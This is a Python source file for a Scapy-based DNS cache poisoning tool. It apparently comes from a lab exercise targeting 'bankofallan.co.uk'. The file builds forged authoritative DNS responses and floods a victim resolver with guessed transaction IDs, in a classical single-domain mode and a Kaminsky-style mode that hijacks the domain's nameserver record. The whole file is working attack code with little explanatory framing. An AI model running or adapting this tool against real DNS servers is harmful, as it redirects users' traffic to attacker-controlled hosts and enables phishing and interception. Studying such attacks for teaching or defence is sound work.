#! /usr/bin/env python3

## @package DNS_Poisoning
#


from scapy import *
from scapy.all import *
import scapy.layers.l2
import signal
import random

from enum import Enum


##  @class DNSPoisoning
#
#   This package includes all methos to execute the poisoning attack.
#   <b>DNSPoisoning.faster_flooding</b> sends packet at layer two (for this reason it requires both victim MAC and network interface specified)
#       , making the attack faster and more prone to succed. However this feature can be used
#       only when the victim server is on the same network of the attacker.\n
#   <b>DNSPoisoning.start_flooding</b> instead uses the IP layer and therefore can be applied in any situation.\n
#   
#   Two types of attack are implemented:
#   - Classical Attack
#   - Dan's Attack
#
#   The first one only tries to spoof a single domain (the one setted in the "spoofed_domain")
#       while the other one tries to spoof the NS server.
#
#   Note: The class by default prints output formatted for the blessing library.
#   That's why inside messages some strings like "{t.bold}" may appear.
#   If you want to use coloured output, write a log function that format messages with a blessing instance.
#   Otherwise write a regex to suppress those strings from output.
#   Take look at the function present in the main.py for example.
#
class DNSPoisoning:

    ##
    #   Perform the type of attack to perform
    class AttackType(Enum):
        ## Classical Poisoning
        NORMAL = 1
        ## Authoritative Poisoning
        DAN = 2

    ##
    #   Raised when an invalid MAC address is provided
    class InvalidMAC(Exception):
        pass



    ##  Constructor
    #
    #   @param victim_server    The IP of the server to attack
    #   @param attacker_ip      The IP of the attacker
    #   @param spoofed_domain   The domain that the tool tries to spoof
    #   @param authoritative_ns The authoritative nameserver for the target domain
    #   @param initial_id       The ID to use for guessing the response TXID. If not specified random ID is used
    #   @param sport            The source port used by the server to send query
    #   @param ttl              The TTL value to put into the relative DNS field. (Default 30000)
    #   @param victim_mac       The victim server MAC address (Only needed for "faster flood" mode).
    #   @param nic_interface    The Network Card Interface to use (Reccomended on "faster flood" mode)
    #   @attack_type            The type of attack to perform, see @ref DNSPoisoning.AttackType for additional references
    #
    #   @param interrupt_handler    The function that handle the CTRL+C signal    
    #   @param log              The function used to print messages
    #
    #
    def __init__(self, victim_server, spoofed_domain, attacker_ip, authoritative_ns,\
         initial_id=None, sport=53, ttl=30000, victim_mac=None, nic_interface=None, socket=None,\
             attack_type=AttackType.NORMAL ,interrupt_handler=None, log=lambda msg: None):
        
        ## Victim Server IP
        self.victim_server = victim_server  
        ## Target domain to spoof    
        self.spoofed_domain = spoofed_domain
        ## IP of the Attacker
        self.attacker_ip = attacker_ip
        ## Source Port of the target DNS
        self.sport = 53
        ## TTL Value to be used in the response
        self.ttl = ttl
        ## Network Interface card to use
        self.nic_interface = nic_interface
        ## Authoritative nameserver
        self.auth_nameserver = authoritative_ns
        ## DNS Request source port
        self.source_port = sport

        self.flood_pool = None
        self.flood_socket = None

        if socket is not None:
            self.flood_socket = socket
        else:
            self.open_socket()

        ## Specify the attack type to perform
        self.attack_type = attack_type

        if initial_id is not None:
            self.id = initial_id
        else:
            self.id = random.randint(0,65535)   #Use a random ID

        ## Invalid URL used in the attack
        self.random_url = 'x' + str(random.randint(10,1000)) + 'x.' + self.spoofed_domain + '.'

        self.victim_mac = victim_mac

        log("Invalid URL used: {t.bold}" + self.random_url + "{t.normal}")

        #Optional Parameters

        ## Logging Function
        self.log = log         
        ## Handler of CTRL+C                     
        self.interrupt_handler = interrupt_handler         



    ##  Set Interface
    #   @brief Set the network interface
    #   @param interface The network interface to use
    def set_interface(self, interface):
        self.nic_interface = interface

    ##
    #   @brief Set Victim MAC address
    #   @param victim_mac   The MAC address to set
    #   Set Victim MAC address. This option is only required in "faster flooding" mode.
    #   
    #   @exceptions Raise DNSPoisoning::InvalidMAC when an invalid MAC is supplied
    def set_victim_mac(self, victim_mac):
        if victim_mac is None:
            raise self.InvalidMAC
        self.victim_mac = victim_mac

    ##
    #   Set the random URL to be used during the attack
    #   @param url  The URL to set
    def set_random_url(self, url):
        self.random_url = url

    ##
    #   Set the ID to be used during the attack
    #   @param id (int) The ID to set
    def set_id(self, id):
        self.id = id

    ##
    #   @brief Set the attck type
    #   @param attack_type (DNSPoisoning.AttackType) Specify the type of attack to perform
    def set_attack_type(self, attack_type):
        #if attack_type not in set(a_type.value for a_type in self.AttackType):
        #    return False
        
        self.attack_type = attack_type
        return True

    ##  Open Socket
    #   @brief Open a socket for flooding
    #
    #   Open a socket for flooding packets instead of creating a new one for each request.
    #
    def open_socket(self):
        if self.flood_socket != None:
            self.flood_socket.close()

        if self.nic_interface is None:
            self.flood_socket = conf.L3socket()   
        else:
            #Open on the specified network interface
            self.flood_socket = conf.L3socket(iface=self.nic_interface)

    ## Create Socket
    #
    #   @brief Create a socket on the specified interface
    #   @param  Interface where the socket should be created
    #
    #   @return A layer 3 Socket
    #
    def create_socket(self, interface):
        return conf.L3socket(iface=interface)

    ##
    #   @brief Return the classical response used in "Classical Attack"
    #   @param ID int Specify the ID to use
    #   @param victim_mac The victim MAC address
    #   @return crafted_response The crafted response use during the attack
    #
    #   If no ID is specified the one inside the class attribute is used.\n
    #   If no victim_mac is specified the response will not include the Ethernet Layer.\n
    #   When using "faster flood" mode the victim_mac should be provided in order to craft the Ethernet layer.
    #   Otherwise only layer 3 will be used.
    #
    #   DNS Crafted response:  
    #   - ID
    #   - Authoritative
    #   - Question
    #       * Invalid Domain
    #   - Source Port 
    #   - Additional RR
    #       - random.bankofallan.co.uk -> attacker_ip
    #       - bankofallan.co.uk -> attacker_ip
    def get_classical_response(self, ID=None, victim_mac=None):
        if ID is None:
            ID = self.id

        crafted_response = IP(dst=self.victim_server, src=self.auth_nameserver)\
            /UDP(dport=self.source_port, sport=53)\
                /DNS(id=ID,\
                    qr=1,\
                    rd=0,\
                    ra=0,\
                    aa=1,\
                    qd=DNSQR(qname=self.random_url, qtype="A", qclass='IN'),\
                    ar=DNSRR(rrname=self.spoofed_domain, type='A', rclass='IN', ttl=self.ttl, rdata=self.attacker_ip)/\
                        DNSRR(rrname=self.random_url, rdata=self.attacker_ip, type="A", rclass="IN", ttl=self.ttl)\
                )  


        if victim_mac is not None:
            # Use layer 2 packets
            crafted_response = Ether(dst=self.victim_mac)/crafted_response

        return crafted_response



    #Scapy field explaination
    #qr = Response Flag
    #rd = Recursion Desidered
    #ra = 
    #aa = Authoritative response
    #nscount = number of NS 
    #arcount = number of authoritative response
    #qdcount = number of question
    #ancount = number of answer

    ##
    #   @brief Return the crafted response used in "Dan's Attack"
    #   @param ID int Specify the ID to use
    #   @param victim_mac The victim MAC address
    #   @return crafted_response The crafted response use during the attack
    #
    #   If no ID is specified the one inside the class attribute is used.\n
    #   If no victim_mac is specified the response will not include the Ethernet Layer.\n
    #   When using "faster flood" mode the victim_mac should be provided in order to craft the Ethernet layer.
    #   Otherwise only layer 3 will be used.
    #
    #   DNS Crafted response:  
    #   - ID
    #   - Authoritative
    #   - Question
    #       * Invalid Domain
    #   - Source Port 
    #   - Authoritative Reponse
    #       * ns.bankofallan.co.uk
    #   - Additional RR
    #       - ns.bankofallan.co.uk -> attacker_ip
    #       - bankofallan.co.uk -> attacker_ip
    def get_dan_response(self, ID=None, victim_mac=None):
        if ID is None:
            ID = self.id


        dan_crafted_response = IP(dst=self.victim_server, src=self.auth_nameserver)\
            /UDP(dport=self.source_port, sport=53)\
                /DNS(id=ID,\
                    qr=1,\
                    #rd=1,\
                    ra=1,\
                    aa=1,\
                    qd=DNSQR(qname=self.random_url, qtype="A", qclass='IN'),\
                    ar=DNSRR(rrname='ns.' + self.spoofed_domain, type='A', rclass='IN', ttl=self.ttl, rdata=self.attacker_ip)/DNSRR(rrname=self.random_url, type='A', rclass='IN', ttl=self.ttl, rdata=self.attacker_ip),\
                    ns=DNSRR(rrname=self.spoofed_domain, type='NS', rclass='IN', ttl=self.ttl, rdata='ns.' + self.spoofed_domain)\
                )

        
        if victim_mac is not None:
            # Use layer 2 packets
            dan_crafted_response = Ether(dst=self.victim_mac)/dan_crafted_response

        return dan_crafted_response

    ## Faster Flooding Mode
    #   @brief Send Crafted Packet via Ethernet packets 
    #   @param  victim_mac  The victim DNS server MAC address. If none is specified the one setted in the contructor will be used.
    #   @param  nic_interface   The network interface to use. If none is specified the one setted in the contructor will be used.
    #  
    #  This funciton floods the request using layer two packet, which is generally faster than using a normal IP. 
    #  
    #
    def faster_flooding(self, victim_mac=None, nic_interface=None):

        if victim_mac is None:
            victim_mac = self.victim_mac
        if nic_interface is None:
            nic_interface = self.nic_interface

        #Check even if the initialized MAC (in the constructor) is none
        if victim_mac is None:
            log("Cannot perform 'faster flooding' mode without target MAC")
            return

        pkts = []

        ## Number of queries and responses to send
        number_of_response = 2
        ## Spacing value to be added to the initial ID value
        spacing = random.randint(1,5)

        start_id = self.id +spacing
        end_id = (self.id + number_of_response + spacing) % 65535-1

        guess_range = range (start_id, end_id)


        self.log("Sending {t.bold}{t.blue}" + str(number_of_response) + "{t.normal} queries")
        self.log("Range from {t.bold}{t.blue}" + str(start_id) + " to " + str(end_id) + "{t.normal}")
        
        # Ask the query to the random url
        query = Ether(dst=victim_mac)/IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(id=random.randint(10,1000), rd=1,qd=DNSQR(qname=self.random_url))
        pkts.append(query)

        for ID in guess_range:

            if self.attack_type is self.AttackType.NORMAL:
                crafted_response = self.get_classical_response(ID, victim_mac)
            elif self.attack_type is self.AttackType.DAN:
                crafted_response = self.get_dan_response(ID, victim_mac)
     
            pkts.append(crafted_response)


        self.log("Start flooding")

        sendp(pkts, verbose=1, iface=nic_interface)


    ## Start Flooding
    #
    #   @brief Start normal flooding attack
    #
    #   @param number_of_guess  Number of response to send (Default 10)
    #   @param spacing          The value to be added to the initial TXID (Default 2)
    #   @param socket           The socket to be used, if none is passed then a new socket is opened
    #
    #   Start the normal flooding attack which uses IP layer packets
    #   
    #
    def start_flooding(self, number_of_guess=2, spacing=None, socket=None):

        if spacing is None:
            spacing = random.randint(1,5)


        start_id = self.id +spacing
        end_id = (self.id + number_of_guess + spacing) % 65535-1

        guess_range = range (start_id, end_id)

        self.log("\nUsing ID from {t.bold}{t.blue}" + str(start_id) + "{t.normal} to {t.bold}{t.blue}" + str(end_id) + "{t.normal}\n",2)

        pkts = []

        # Ask the query to the random url
        query = IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(id=random.randint(10,1000), rd=1,qd=DNSQR(qname=self.random_url))
        pkts.append(query)

        for ID in guess_range:

            if self.attack_type == self.AttackType.NORMAL:
                crafted_response = self.get_classical_response(ID)
            elif self.attack_type == self.AttackType.DAN:
                crafted_response = self.get_dan_response(ID)

            pkts.append(crafted_response)

        self.log("Same socket for faster flood...", 3)
        if socket is None:
            self.open_socket()
            if self.flood_socket is None:    
                self.open_socket()
            socket = self.flood_socket

        send(pkts, socket=socket, verbose=1)

        self.log("Flood finished", 2)


    ##  Stop Handler
    #   @brief Function called when CTRL+C is pressed
    #
    def stop_handler(self, sig, frame):
        self.log("Closing socket",3)
        self.flood_socket.close()
        self.log("Cache poisoning stopped",2)

        if self.interrupt_handler  != None:     #If an interrupt handler is passed
            signal.signal(signal.SIGINT, self.interrupt_handler)    #Set it as a new SIGINT handler
